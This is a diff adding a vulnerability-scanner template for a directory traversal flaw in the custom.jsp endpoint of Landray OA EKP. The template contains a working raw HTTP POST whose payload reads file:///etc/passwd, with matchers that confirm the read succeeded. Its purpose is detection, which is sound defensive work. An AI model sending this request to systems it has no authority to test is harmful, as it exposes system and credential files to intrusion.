@@ -1,0 +1,27 @@
+id: landray-oa-ekp-directory-traversal
+info:
+  name: Landray OA EKP Directory Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Landray OA (EKP) has a directory traversal vulnerability in the `custom.jsp` endpoint, allowing attackers to access hidden files such as configuration files, logs, and source code. This vulnerability can lead to privilege escalation when combined with other vulnerabilities.
+  reference:
+    - http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20custom.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
+  tags: directory-traversal
+http:
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        var={"body":{"file":"file:///etc/passwd"}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
